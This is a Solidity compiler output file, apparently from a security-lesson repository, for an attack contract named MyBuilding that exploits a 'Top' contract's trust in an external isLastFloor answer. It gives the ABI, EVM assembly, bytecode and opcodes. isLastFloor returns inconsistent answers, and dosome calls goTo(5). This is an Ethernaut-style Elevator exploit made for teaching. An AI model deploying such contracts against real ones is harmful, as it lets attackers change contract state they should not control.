{
	"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol": {
		"MyBuilding": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "adr",
							"type": "address"
						}
					],
					"name": "dosome",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "i",
							"type": "uint256"
						}
					],
					"name": "isLastFloor",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":83:409  contract MyBuilding{... */\n  mstore(0x40, 0x80)\n    /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":120:121  5 */\n  0x05\n    /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":108:121  uint temp = 5 */\n  0x00\n  sstore\n    /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":83:409  contract MyBuilding{... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":83:409  contract MyBuilding{... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x5f9a4bca\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x8d45d1c5\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":138:318  function isLastFloor(uint i) external returns (bool){... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_6\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_6:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_7\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":324:407  function dosome(address adr) public{... */\n    tag_4:\n      tag_8\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_10\n      jump\t// in\n    tag_8:\n      stop\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":138:318  function isLastFloor(uint i) external returns (bool){... */\n    tag_7:\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":185:189  bool */\n      0x00\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":211:212  i */\n      dup2\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":203:207  temp */\n      sload(0x00)\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":203:212  temp == i */\n      eq\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":200:312  if(temp == i){... */\n      iszero\n      tag_12\n      jumpi\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":234:235  6 */\n      0x06\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":227:231  temp */\n      0x00\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":227:235  temp = 6 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":256:261  false */\n      0x00\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":249:261  return false */\n      swap1\n      pop\n      jump(tag_11)\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":200:312  if(temp == i){... */\n    tag_12:\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":297:301  true */\n      0x01\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":290:301  return true */\n      swap1\n      pop\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":138:318  function isLastFloor(uint i) external returns (bool){... */\n    tag_11:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":324:407  function dosome(address adr) public{... */\n    tag_10:\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":377:380  adr */\n      dup1\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":369:370  e */\n      0x01\n      0x00\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":369:381  e = Top(adr) */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":391:392  e */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":391:397  e.goTo */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xed9a7134\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":398:399  5 */\n      0x05\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":391:400  e.goTo(5) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_17\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_17:\n      pop\n      pop\n      pop\n      pop\n        /* \"SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol\":324:407  function dosome(address adr) public{... */\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212203d70f58eef834bbbfb948b685d28aa8a9ca06bf469a38dbfd80674dc050a027f64736f6c634300060c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052600560005534801561001557600080fd5b506101f2806100256000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80635f9a4bca1461003b5780638d45d1c51461007f575b600080fd5b6100676004803603602081101561005157600080fd5b81019080803590602001909291905050506100c3565b60405180821515815260200191505060405180910390f35b6100c16004803603602081101561009557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100ea565b005b60008160005414156100e0576006600081905550600090506100e5565b600190505b919050565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed9a713460056040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156101a157600080fd5b505af11580156101b5573d6000803e3d6000fd5b505050505056fea26469706673582212203d70f58eef834bbbfb948b685d28aa8a9ca06bf469a38dbfd80674dc050a027f64736f6c634300060c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x5 PUSH1 0x0 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x15 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1F2 DUP1 PUSH2 0x25 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5F9A4BCA EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x8D45D1C5 EQ PUSH2 0x7F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x67 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xC3 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC1 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x95 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xEA JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x0 SLOAD EQ ISZERO PUSH2 0xE0 JUMPI PUSH1 0x6 PUSH1 0x0 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP1 POP PUSH2 0xE5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xED9A7134 PUSH1 0x5 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1A1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1B5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 RETURNDATASIZE PUSH17 0xF58EEF834BBBFB948B685D28AA8A9CA06B DELEGATECALL PUSH10 0xA38DBFD80674DC050A02 PUSH32 0x64736F6C634300060C0033000000000000000000000000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "99600",
						"executionCost": "20153",
						"totalCost": "119753"
					},
					"external": {
						"dosome(address)": "infinite",
						"isLastFloor(uint256)": "21135"
					}
				},
				"methodIdentifiers": {
					"dosome(address)": "8d45d1c5",
					"isLastFloor(uint256)": "5f9a4bca"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 10,
						"contract": "SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol:MyBuilding",
						"label": "temp",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					},
					{
						"astId": 12,
						"contract": "SecLessonPoc-main/contracts/externalContract/attack/TopAttack.sol:MyBuilding",
						"label": "e",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(Top)7"
					}
				],
				"types": {
					"t_contract(Top)7": {
						"encoding": "inplace",
						"label": "contract Top",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}